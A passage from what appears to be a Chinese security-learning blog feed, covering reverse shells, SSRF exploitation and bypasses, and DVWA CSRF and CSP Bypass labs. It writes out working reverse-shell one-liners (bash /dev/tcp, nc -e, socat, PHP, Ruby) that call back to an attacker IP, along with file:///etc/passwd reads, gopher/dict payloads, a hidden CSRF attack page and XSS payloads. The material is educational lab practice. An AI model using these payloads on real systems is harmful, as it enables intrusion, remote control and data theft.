&lt;&lt;</code></td><td>[n]&lt; word</td><td>将文件描述符 n 重定向到 word 指代的文件（只读）,n默认为0（标准输入）</td></tr><tr><td>输出重定向</td><td><code>&gt; &gt;&gt;</code></td><td>[n]&gt; word</td><td>将文件描述符 n 重定向到word 指代的文件（写），n 默认为 1（标准输出）</td></tr></tbody></table><p>几种常见方式:</p><table><thead><tr><th>重定向方式</th><th>描述</th></tr></thead><tbody><tr><td>301 redirect</td><td>永久性转移，是网页更改地址后对搜索引擎友好的最好方法</td></tr><tr><td>302 redirect</td><td>暂时性转移</td></tr><tr><td>meta fresh</td><td>通过网页中的meta指令，在特定时间后重定向到新的网页，如果延迟的时间太短(约5秒之内)，会被判断为spam。</td></tr></tbody></table><p>bash 在执行一条指令时，会先检查命令中存不存在重定向的符号，如果存在先将文件描述符重定向，然后再把重定向去掉，执行指令（有点优先级的感觉）。如果指令中存在多个重定向，重定向会从左向右解析。</p><p><strong>文件描述符的复制</strong></p><p>格式</p><pre><code class="hljs inform7"><span class="hljs-comment">[n]</span>&lt;&amp;<span class="hljs-comment">[m]</span> （只读）/ <span class="hljs-comment">[n]</span>&gt;&amp;<span class="hljs-comment">[m]</span>（写）</code></pre><p><strong>&amp; 是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件</strong></p><p><strong>exec 绑定重定向</strong></p><p>格式</p><pre><code class="hljs arcade">exec [n] &lt;<span class="hljs-regexp">/&gt; file/</span>[n]</code></pre><p>绑定后只对当前指令有效，如果需要接下来的指令都支持的话就需要再使用 exec 指令。</p><h1>Reverse Shell实例</h1><p>attacker(kali):<code>192.168.67.128</code></p><p>victim(ubuntu)：<code>192.168.67.129</code></p><h2 id="bash"><a class="header-anchor" href="#bash">🍭</a>bash</h2><p>在ubuntu执行：</p><p><code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p><img src="/2021/02/08/shell/2.png" alt="2"></p><p>在kali监听：</p><p><img src="/2021/02/08/shell/1.jpg" alt="1"></p><p>kali连接到ubuntu的shell。下面我们来推导一下这个命令怎么来的：</p><h4 id="实现输出命令"><a class="header-anchor" href="#实现输出命令">🍭</a>实现输出命令</h4><p>在Ubuntu输入字符串</p><p><code>echo genius &gt; /dev/tcp/192.168.67.128/2333</code></p><p>kali上</p><p><img src="/2021/02/08/shell/3.jpg" alt="3"></p><h4 id="实现输入命令"><a class="header-anchor" href="#实现输入命令">🍭</a>实现输入命令</h4><p>在kali输入</p><p><img src="/2021/02/08/shell/4.jpg" alt="4"></p><p>在ubuntu输出</p><p><img src="/2021/02/08/shell/5.jpg" alt="5"></p><h4 id="实现交互"><a class="header-anchor" href="#实现交互">🍭</a>实现交互</h4><p><code> bash -i &gt; /dev/tcp/192.168.67.128/2333</code></p><p>在ubuntu上的命令会在Kali显示执行结果</p><p>ubuntu</p><p><img src="/2021/02/08/shell/7.jpg" alt="7"></p><p>kali</p><p><img src="/2021/02/08/shell/6.jpg" alt="6"></p><p>但现在kali的命令不能在Ubuntu上执行。还需要：<code>bash -i &lt; /dev/tcp/192.168.67.128/2333</code>将kali的命令输入给ubuntu的bash。</p><p>ubuntu</p><p><img src="/2021/02/08/shell/8.jpg" alt="8"></p><p>现在Kali就可以在ubuntu执行命令了。</p><p>将两条命令结合：<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code></p><p>kali</p><p><img src="/2021/02/08/shell/9.jpg" alt="9"></p><p>但是在ubuntu上仍有命令</p><p><img src="/2021/02/08/shell/10.jpg" alt="10"></p><p>构造：<code>bash -i &gt; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1 2&gt;&amp;1</code>与最开始的命令<code>bash -i &gt;&amp; /dev/tcp/192.168.67.128/2333 0&gt;&amp;1</code>等价，测试ubuntu上无回显。成功~~</p><p>也可以exec重定向</p><p><img src="/2021/02/08/shell/11.png" alt="11"></p><p>or</p><pre><code class="hljs angelscript">exec /bin/sh <span class="hljs-number">0</span>&lt;/dev/tcp/<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>/<span class="hljs-number">2333</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">0</span></code></pre><h2 id="nc"><a class="header-anchor" href="#nc">🍭</a>nc</h2><pre><code class="hljs angelscript">nc -e /bin/bash <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="telent"><a class="header-anchor" href="#telent">🍭</a>telent</h2><pre><code class="hljs angelscript">telnet <span class="hljs-number">192.168</span><span class="hljs-number">.99</span><span class="hljs-number">.242</span> <span class="hljs-number">1234</span> | /bin/bash | telnet <span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span> <span class="hljs-number">2333</span></code></pre><h2 id="socat"><a class="header-anchor" href="#socat">🍭</a>socat</h2><pre><code class="hljs angelscript">socat exec:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">192.168</span><span class="hljs-number">.67</span><span class="hljs-number">.128</span>:<span class="hljs-number">2333</span></code></pre><h2 id="php"><a class="header-anchor" href="#php">🍭</a>php</h2><pre><code class="hljs tcl">php -r &#x27;$sock=fsockopen(<span class="hljs-string">&quot;192.168.67.128&quot;</span>,<span class="hljs-number">2333</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</code></pre><h2 id="ruby"><a class="header-anchor" href="#ruby">🍭</a>ruby</h2><pre><code class="hljs pgsql">ruby -rsocket -<span class="hljs-string">e&#x27;f=TCPSocket.open(&quot;192.168.67.128&quot;,2333).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></code></pre><p>完🚩🚩🚩🚩</p><p>参考：<a href="https://www.cnblogs.com/xiaozi/p/13493010.html">反弹shell的各种姿势</a></p><p><a href="https://xz.aliyun.com/t/2549#toc-0">Linux 反弹shell（二）反弹shell的本质</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2021/02/08/SSRF/"/>
    <url>/2021/02/08/SSRF/</url>
    
    <content type="html"><![CDATA[<p>SSRF(<code>Server-Side Request Forgery</code>:服务器端请求伪造) 由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。（请求由服务端发起，故服务端能请到与自身相连而与外网隔离的内部系统）</p><p><strong>漏洞原理</strong><br>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。常见的有服务端从指定URL地址获取网页文本内容，加载指定地址的图片……SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p><p>主要攻击方式：</p><ul><li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li><li>攻击运行在内网或本地的应用程序。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用<code>HTTP GET</code>请求就可以实现的攻击(<code>如struts2、SQli等</code>)。</li><li>利用file协议读取本地文件等。</li></ul><p>简而言之就是通过外网网站，访问内部网站，达到攻击内部网站的目的。</p><h2 id="相关危险函数"><a class="header-anchor" href="#相关危险函数">🍭</a>相关危险函数</h2><pre><code class="hljs autohotkey">file_get_contents()` / `fsockopen()` / `curl_exec()</code></pre><h4 id="curl-exec"><a class="header-anchor" href="#curl-exec">🍭</a>curl_exec()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;      $ch = curl_init();    curl_setopt($ch, CURLOPT_URL, $url);    curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);    curl_exec($ch);    curl_close($ch);&#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><h4 id="file-get-contents"><a class="header-anchor" href="#file-get-contents">🍭</a>file_get_contents()</h4><pre><code class="hljs bash"><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);</code></pre><h4 id="fsockopen"><a class="header-anchor" href="#fsockopen">🍭</a>fsockopen()</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getfile</span>(<span class="hljs-params">$host, $port, $link</span>)</span>&#123;    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="hljs-number">30</span>);    <span class="hljs-keyword">if</span>(!$fp)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>;    &#125;<span class="hljs-keyword">else</span>&#123;        $out = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;HOST <span class="hljs-subst">$host</span> \r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;        $out .= <span class="hljs-string">&quot;\r\n&quot;</span>;        fwrite($fp, $out);        $content = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-keyword">while</span>(!feof($fp))&#123;            $contents .= fgets($fp, <span class="hljs-number">1024</span>);        &#125;        fclose($fp);        <span class="hljs-keyword">return</span> $contents;    &#125;&#125;</code></pre><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">🍭</a>漏洞利用</h2><h3 id="curl支持"><a class="header-anchor" href="#curl支持">🍭</a>curl支持</h3><p><img src="/2021/02/08/SSRF/1.jpg" alt="1"></p><h3 id="本地利用"><a class="header-anchor" href="#本地利用">🍭</a>本地利用</h3><h4 id="file-protocol（任意文件读取）"><a class="header-anchor" href="#file-protocol（任意文件读取）">🍭</a>file protocol（任意文件读取）</h4><p>file协议可以避免服务端程序对IP进行过滤</p><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span></code></pre><h4 id="gopher-protocol（一键反弹bash）"><a class="header-anchor" href="#gopher-protocol（一键反弹bash）">🍭</a>gopher protocol（一键反弹bash）</h4><p>gopher可以发送各种请求包（故又称万金油），格式:</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;gopher://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/<span class="hljs-doctag">&lt;gopher-path&gt;</span>&#x27;</span></code></pre><p>详见：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher协议拓展攻击面</a></p><h4 id="dict-protocol-操作redis"><a class="header-anchor" href="#dict-protocol-操作redis">🍭</a>dict protocol(操作redis)</h4><p>dict协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，在SSRF中使用dict协议可以轻易获取目标服务器端口上运行的服务版本等信息。</p><p>格式：</p><pre><code class="hljs vbnet">curl -vvv <span class="hljs-comment">&#x27;dict://<span class="hljs-doctag">&lt;host&gt;</span>:<span class="hljs-doctag">&lt;port&gt;</span>/info&#x27;</span></code></pre><h3 id="远程利用"><a class="header-anchor" href="#远程利用">🍭</a>远程利用</h3><h4 id="未作SSRF防御的代码"><a class="header-anchor" href="#未作SSRF防御的代码">🍭</a>未作SSRF防御的代码</h4><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params">$url</span>)</span>&#123;                $ch = curl_init();                curl_setopt($ch, CURLOPT_URL, $url);                curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);                 curl_exec($ch);                curl_close($ch); &#125;$url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>];curl($url);</code></pre><p><strong>利用file协议读取：</strong></p><p><img src="/2021/02/08/SSRF/2.jpg" alt="2"></p><p><strong>利用dict查看端口</strong></p><p><img src="/2021/02/08/SSRF/3.jpg" alt="3"></p><p>端口未开放时就需要用到gopher协议反弹shell，在reverse shell讲了。</p><h4 id="限制协议的代码"><a class="header-anchor" href="#限制协议的代码">🍭</a>限制协议的代码</h4><p><img src="/2021/02/08/SSRF/4.png" alt="4"></p><h2 id="SSRF绕过"><a class="header-anchor" href="#SSRF绕过">🍭</a>SSRF绕过</h2><h4 id="更改ip"><a class="header-anchor" href="#更改ip">🍭</a>更改ip</h4><p>开发者对URL参数进行正则匹配过滤内网IP时，我们可以采用改编IP的写法的方式进行绕过，将ip改写：</p><ul><li>8进制格式</li><li>16进制格式</li><li>10进制整数格式</li><li>16进制整数格式</li><li>合并后两位</li><li>合并后三位</li></ul><p>改写时各个进制可以混用，访问改写后的IP地址时，Apache会报错，但Nginx、MySQL仍正常工作。</p><h4 id="利用解析URL出现的问题"><a class="header-anchor" href="#利用解析URL出现的问题">🍭</a>利用解析URL出现的问题</h4><p>当后端程序对访问的URL进行解析，并将解析出来的地址进行过滤。这时候可能会出现对URL参数解析不当，比如 <code>http://www.baidu.com@192.168.67.129</code>  当后端程序通过不正确的正则表达式，比如解析到http之后到com为止的字符内容时，<a href="http://xn--URLhostwww-xx2pha710ae15suhwcnmaj19l.baidu.com">会认为访问URL的host为www.baidu.com</a>，但实际上这个URL所请求的内容是192.168.67.129上的</p><h4 id="利用跳转"><a class="header-anchor" href="#利用跳转">🍭</a>利用跳转</h4><p>URL的host被正确解析并过滤时，可使用跳转进行绕过，如 <a href="http://xxx/redirect-to?url=http://192.168.67.129">http://xxx/redirect-to?url=http://192.168.67.129</a> ，但是192.168.67.129可能会被正则表达式过滤，可以通过短地址绕过。常用302跳转和307跳转（reverse shell讲过）</p><h4 id="协议绕过"><a class="header-anchor" href="#协议绕过">🍭</a>协议绕过</h4><p>除了上面讲到的file,gopher，dict协议还有以下几种：</p><pre><code class="hljs awk">SFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=sftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TFTP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=tftp:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/TESTUDPPACKETLDAP:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.php?url=ldap:<span class="hljs-regexp">//</span>&lt;host&gt;:&lt;port&gt;/%<span class="hljs-number">0</span>astats%<span class="hljs-number">0</span>aquit</code></pre><h4 id="利用特殊域名"><a class="header-anchor" href="#利用特殊域名">🍭</a>利用特殊域名</h4><p>原理是DNS解析</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">67.129</span>.xip.io<span class="hljs-regexp">/   /</span><span class="hljs-regexp">/自动重定向到192.168.67.129</span></code></pre><h4 id="IPv6"><a class="header-anchor" href="#IPv6">🍭</a>IPv6</h4><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤</p><h4 id="IDN"><a class="header-anchor" href="#IDN">🍭</a>IDN</h4><p>一些网络访问工具支持国际化域名(特殊字符域名)，指部分或完全使用特殊的文字或字母组成的互联网域名。部分字符会在访问时做一个等价转换</p><pre><code class="hljs avrasm">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<span class="hljs-symbol">such:</span>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</code></pre><h4 id="利用句号"><a class="header-anchor" href="#利用句号">🍭</a>利用句号</h4><pre><code class="hljs angelscript"><span class="hljs-number">127</span>。<span class="hljs-number">0</span>。<span class="hljs-number">0</span>。<span class="hljs-number">1</span>  &gt;&gt;&gt;  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></code></pre><h4 id="DNS-重绑"><a class="header-anchor" href="#DNS-重绑">🍭</a>DNS 重绑</h4><p>用户请求的URL参数时，服务器端会先对其进行DNS解析，再对DNS Server返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。请求DNS服务进行域名解析到服务端请求URL之间存在一个时间差，利用这个时间差，进行DNS重绑定攻击。流程如下:</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="利用特殊地址"><a class="header-anchor" href="#利用特殊地址">🍭</a>利用特殊地址</h4><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/</code></pre><p><strong>以上绕过方式也可以组合进行绕过</strong></p><h2 id="防御方式"><a class="header-anchor" href="#防御方式">🍭</a>防御方式</h2><ul><li>过滤返回的信息</li><li>限制协议为HTTP，HTTPS</li><li>统一错误信息</li><li>限制请求的端口</li><li>限制302重定向</li><li>考虑使用DNS缓存或者Host白名单</li></ul><p>完🍓🍓🍓</p><p>参考：<a href="https://www.cnblogs.com/iors/p/9777571.html">SSRF漏洞攻击与防御</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">SSRF</a></p><p><a href="https://www.secpulse.com/archives/65832.html">SSRF绕过总结</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSRF</title>
    <link href="/2021/02/03/dvwa6/"/>
    <url>/2021/02/03/dvwa6/</url>
    
    <content type="html"><![CDATA[<p>CSRF，全称Cross-site request forgery，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS区别在于CSRF并没有盗取cookie而是直接利用。</p><p>举个栗子🌞🌞🌞：</p><p>A要汇八万给B，A可以通过对银行的网站发送请求<code>http://bank/account=A&amp;amout=80000&amp;receive=B</code>(假设)这时候C想得到这八万，他就可以先自己做一个网站，在网站中放入如下代码：  <code>http://bank/account=A&amp;amount=80000&amp;receive=C</code>，然后通过广告或者链接诱使 A 来访问他的网站。当 A 访问该网站时，上述 url 就会从 A 的浏览器发向银行，而这个请求会附带  A浏览器中的 cookie 一起发向银行服务器。多数情况下，请求会失败，因为他会验证 A的信息，但如果 A  当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 A 的认证信息。这时， url 请求就会得到响应，钱将从A的账号转移到C 的账号，而 A不知情。即使A去银行查询记录，也只能发现有一个来自于他本人的合法请求转移了资金。（就很惨，不过现在的银行的网站应该没有这种漏洞吧👏👏👏）</p><p><strong>CSRF漏洞检测</strong></p><p>抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，则存在CSRF漏洞。也可以借助工具</p><p>检测工具:<code>CSRFTester</code>，<code>CSRF Request Builder</code>.</p><h1>low</h1><p><img src="/2021/02/03/dvwa6/1.jpg" alt="1"></p><p>没有防御CSRF</p><p>在页面更改密码发现网址<code>http://localhost/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#</code>但不能直接放这个网址（可以用在线工具将网址变短)去诱导别人点击（谁那么傻)所以要委婉一点:</p><p>先在我的虚拟机(模拟一下攻击者的主机)上写个网页:</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display:none;&quot;</span>/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>404<span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>file not found<span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span></code></pre><p>然后再物理机上访问它（模拟受害者）</p><p><img src="/2021/02/03/dvwa6/2.jpg" alt="2"></p><p>然后查看一下管理员的密码</p><p><img src="/2021/02/03/dvwa6/3.jpg" alt="3"></p><p>解码</p><p><img src="/2021/02/03/dvwa6/4.jpg" alt="4"></p><p>密码就被改辽。也可以抓包改网址处理</p><h1>medium</h1><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>( stripos( $_SERVER[ <span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="hljs-literal">false</span> )</code></pre><p>增加了对用户请求头的中的Referer字段的校验，请求头中的Referer字段必须包含主机地址。</p><p><img src="/2021/02/03/dvwa6/7.jpg" alt="7"></p><p>只要包含了主机地址就可以绕过，所以构造的文件名为：<code>127.0.0.1.html</code>即可绕过。也可在burp中<code>CSRF POC</code>模块中更改。</p><h1>high</h1><p>代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器都会返回一个随机的token，当浏览器向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求（之前介绍过)token值被放到url最后。本关解题关键是利用用户的cookie去修改密码的页面获取关键的token。构造一个攻击页面，引诱受害者访问(PS:这个攻击代码是去教程copy的，等我系统学习一下JavaScript在来自己写一个,不过里面用到的函数，标签，语法在dvwa||XSS和dvwa||CSP Bypass都讲过了)</p><pre><code class="hljs pgsql">&lt;script <span class="hljs-keyword">type</span>=&quot;text/javascript&quot;&gt;    <span class="hljs-keyword">function</span> attack()&#123;        document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>=document.getElementById(&quot;hack&quot;).contentWindow.document.getElementsByName(<span class="hljs-string">&#x27;user_token&#x27;</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">value</span>;        document.getElementById(&quot;transfer&quot;).submit();     &#125;&lt;/script&gt;&lt;iframe src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot; id=&quot;hack&quot; border=&quot;0&quot; style=&quot;display:none;&quot;&gt;&lt;/iframe&gt;&lt;body onload=&quot;attack()&quot;&gt;    &lt;form <span class="hljs-keyword">method</span>=&quot;GET&quot; id=&quot;transfer&quot; action=&quot;http://127.0.0.1/dvwa/vulnerabilities/csrf&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_new&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;password_conf&quot; <span class="hljs-keyword">value</span>=&quot;password&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;user_token&quot; <span class="hljs-keyword">value</span>=&quot;&quot;&gt;        &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;Change&quot; <span class="hljs-keyword">value</span>=&quot;Change&quot;&gt;    &lt;/form&gt;&lt;/body&gt;</code></pre><p>因为浏览器不允许跨域，而用户的服务器在本地端，攻击者在另一个服务器(我的虚拟机里)，当用户主动发送信息给攻击者的服务器时，攻击脚本才可能获取token令牌。这就要结合之前学的XSS辽，在XSS的high中输入 <code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName('user_token')[0].value)&gt; </code>，即可获取token。参考：<a href="https://www.cnblogs.com/zhengna/p/12736823.html">high-绕过token</a>。</p><h1>impossible</h1><p>本关要求输入之前的密码，CSRF就有点困难了，除非攻击者能得到用户当前密码。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||CSP Bypass</title>
    <link href="/2021/02/02/dvwa9/"/>
    <url>/2021/02/02/dvwa9/</url>
    
    <content type="html"><![CDATA[<p>Content-Security-Policy（内容安全策略）是指HTTP返回报文头中的标签，浏览器会根据标签中的内容，判断哪些资源可以加载或执行。是为了缓解潜在的跨站脚本问题（XSS）原来应对XSS攻击时，主要采用函数过滤、转义输入中的特殊字符、标签、文本来规避攻击。CSP的实质就是白名单制度，开发人员明确告诉客户端，哪些外部资源可以加载和执行。开发者只需要提供配置，实现和执行全部由浏览器完成。简而言之就是在前端添加一些标签，告诉浏览器哪些资源可以加载访问。我们今天要做的就是绕过他。</p><h1>low</h1><p>源码列了几个白名单网站</p><p><img src="/2021/02/02/dvwa9/8.jpg" alt="8"></p><p>我们可以在白名单网站写js代码如<code>alert(111)</code>得到<code>https://pastebin.com/5WMivnEr</code>，在dvwa页面进行访问，理论上就会达到注入效果，但是现在的火狐好像被修复了</p><p><img src="/2021/02/02/dvwa9/9.jpg" alt="9"></p><p>其实这关也可以用CSRF实现，还是一样通过做钓鱼网站来实现。</p><h1>medium</h1><p><img src="/2021/02/02/dvwa9/1.jpg" alt="1"></p><p>构造：<code>&lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot; &gt; alert('xss')&lt;/script&gt;</code><img src="/2021/02/02/dvwa9/2.jpg" alt="2" style="zoom: 50%;"></p><h1>high</h1><p><code>The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</code>页面调用了jsonp.php,该页面可执行自己的代码</p><p>在页面源码中看到了</p><p><img src="/2021/02/02/dvwa9/3.jpg" alt="3"></p><p>打开</p><p><img src="/2021/02/02/dvwa9/4.jpg" alt="4"></p><p>主要规划了点击按钮后的操作，<code>appendChild（）</code>处理的<code>jsonp.php</code>里倒没有什么特别的处理，故我们可以从这里要传入的<code>callback</code>下手：</p><p>构造：<code>include=&lt;script src=&quot;source/jsonp.php?callback=alert('lisa');&quot;&gt;&lt;/script&gt;</code></p><img src="/2021/02/02/dvwa9/5.jpg" alt="5" style="zoom:50%;"><h1>impossible</h1><p><code>impossible.php</code>，<code>impossible.js</code>都和high没什么区别，关键在于<code>appendChild（）</code>处理的<code>jsonp.php</code>处理不同：</p><p>这是high的</p><p><img src="/2021/02/02/dvwa9/6.jpg" alt="6"></p><p>这个是impossible的</p><p><img src="/2021/02/02/dvwa9/7.jpg" alt="7"></p><p>参考：<a href="https://www.cnblogs.com/linfangnan/p/13714694.html">DVWA 通关指南：CSP Bypass(CSP 绕过)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Weak Session IDs</title>
    <link href="/2021/02/01/dvwa8/"/>
    <url>/2021/02/01/dvwa8/</url>
    
